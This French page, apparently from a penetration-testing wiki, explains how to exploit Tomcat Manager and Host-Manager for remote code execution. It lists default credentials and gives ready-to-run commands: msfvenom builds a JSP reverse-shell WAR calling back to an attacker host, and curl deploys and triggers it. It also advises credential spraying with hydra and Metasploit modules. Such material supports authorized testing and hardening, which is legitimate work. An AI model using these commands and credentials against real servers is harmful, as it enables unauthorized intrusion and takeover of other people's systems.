---
title: "Tomcat Manager et Host-Manager : déploiement de WAR vers RCE"
description: "Exploiter les applications Tomcat Manager et Host-Manager : identifiants par défaut et faibles, atteinte de l'endpoint de déploiement et téléversement d'un webshell WAR pour l'exécution de code à distance."
keywords:
  - tomcat manager
  - host-manager
  - déploiement de WAR
  - identifiants par défaut
  - rce tomcat
---

# Manager et Host-Manager

Tomcat embarque deux applications web de gestion différentes. L'application **Manager** (`/manager/html` et l'API texte `/manager/text`, rôles `manager-gui`/`manager-script`) peut **déployer une application web** ; déployer un WAR exécute son code, donc l'accès à Manager est une RCE directe. L'application **Host-Manager** (`/host-manager/html`, rôles `admin-gui`/`admin-script`) administre les *hôtes virtuels*, elle ne téléverse ni ne déploie **aucun** WAR. On les atteint de la même façon (identifiants par défaut/faibles, ou endpoint non restreint à un réseau d'administration), mais seul Manager offre le chemin propre WAR-vers-RCE ci-dessous.

## Obtenir l'accès

- **Identifiants par défaut et faibles** : `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret`, `admin:<blank>`, et les valeurs par défaut des fournisseurs dans `tomcat-users.xml`. Le Manager exige un utilisateur disposant du rôle `manager-gui`/`manager-script`.
- **Identifiants fuités** : `tomcat-users.xml` récupéré via [AJP/Ghostcat](ajp-ghostcat.md), un `.git`/une sauvegarde exposés, ou une lecture par traversal.
- **Atteindre l'endpoint** : `/manager/html`, `/manager/text`, `/host-manager/html` ; parfois restreint au localhost au niveau de l'application mais joignable via un [désaccord de normalisation sur le proxy](../reverse-proxy-and-edge/normalization-mismatch.md) ou une [exposition de l'origin](../reverse-proxy-and-edge/origin-exposure.md).

## Déployer un WAR

Construire un WAR contenant un webshell JSP et le déployer via l'API texte :

```bash
# Build a JSP webshell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=you LPORT=4444 -f war > shell.war

# Deploy via the Manager text API (manager-script role)
curl -u tomcat:tomcat -T shell.war \
  "http://target:8080/manager/text/deploy?path=/shell&update=true"

# Trigger it
curl "http://target:8080/shell/"
```

La GUI (`/manager/html`) propose la même chose via un formulaire de téléversement de fichier. Host-Manager n'est pas une route de déploiement de WAR ; lorsque vous ne disposez que de Host-Manager, son abus relève de l'administration d'hôtes virtuels : créer ou reconfigurer un hôte (`appBase`/`docBase`) et son comportement de déploiement au démarrage pour qu'un contexte serve depuis un répertoire influencé par l'attaquant, ou supprimer un hôte pour perturber l'application. C'est plus faible que le déploiement direct de Manager et cela dépend de ce que vous pouvez écrire par ailleurs sur le disque, donc traitez l'accès à Host-Manager comme un pivot, pas comme une RCE immédiate.

## Exploitation

- Tester par spray les identifiants par défaut courants contre `/manager/text/list` (un `200` avec une liste d'applications confirme l'accès et le rôle).
- Déployer un WAR de shell JSP, demander son chemin de contexte, et vous obtenez l'exécution de code en tant qu'utilisateur Tomcat.
- Si seul `manager-gui` (et non `manager-script`) est disponible, utiliser le formulaire de téléversement HTML ; si le jeton CSRF bloque le scripting, piloter la GUI via le flux du navigateur.

## Outils

- **msfvenom** (payload WAR), Metasploit `tomcat_mgr_deploy`/`tomcat_mgr_upload`, **hydra** pour le spray d'identifiants.

## Références

- Apache Tomcat: Manager App HOW-TO, realm and role configuration
- OWASP: Testing for default credentials
